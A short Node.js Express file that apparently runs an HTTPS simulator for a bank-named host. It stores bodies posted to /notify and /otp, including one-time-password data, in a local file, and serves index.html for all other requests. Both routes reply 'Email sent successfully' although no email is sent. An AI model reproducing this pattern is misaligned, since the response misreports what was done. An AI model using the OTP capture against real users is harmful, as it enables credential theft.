const fs = require('fs');
const https = require('https');
const express = require('express');
const parser = require ('body-parser');

const app = express();

// Certificate
const privateKey = fs.readFileSync('/etc/letsencrypt/live/fnbsim.southafricanorth.cloudapp.azure.com/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/fnbsim.southafricanorth.cloudapp.azure.com/cert.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/fnbsim.southafricanorth.cloudapp.azure.com/chain.pem', 'utf8');

const credentials = {
        key: privateKey,
        cert: certificate,
        ca: ca
};

app.use(express.json());

app.post('/notify', function (req, res) {
        fs.writeFile ('./foo.json', JSON.stringify(req.body), (err) => {
            if (!err) {
                console.log('done');
            }
        });
        
        
        
        res.status(200).send('Email sent successfully');
})

app.post('/otp', function (req, res) {
        fs.writeFile ('./foo.json', JSON.stringify(req.body), (err) => {
            if (!err) {
                console.log('done');
            }
        });
        
        
        
        res.status(200).send('Email sent successfully');
})

app.use((req, res) => {
        fs.readFile('index.html', function(err, data) {
                res.writeHead (200, {'Content-Type':'text/html'});
                res.write(data);
                res.end();
        });
});

const httpsServer = https.createServer(credentials, app);

httpsServer.listen(443, () => {
        console.log('HTTPS Server running on port 443');
});
